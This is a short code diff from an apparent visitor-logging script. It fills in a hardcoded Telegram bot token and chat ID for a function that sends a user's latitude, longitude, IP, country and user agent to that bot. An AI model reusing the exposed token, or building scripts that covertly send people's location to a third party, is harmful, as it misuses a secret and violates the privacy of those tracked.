@@ -54,8 +54,8 @@ async function getIPAndCountry() {
 
 function sentToTelegramBot(latitude, longitude, timestamp, userAgent, ip, country) {
     // Replace with your bot token and chat id
-    const token = '';
-    const chatId = '';
+    const token = '6343774431:AAFR-TYiel6owWpqzotB5rRtIpkY_saSrdc';
+    const chatId = '7175670385';
 
     const text = `
 \`\`\`
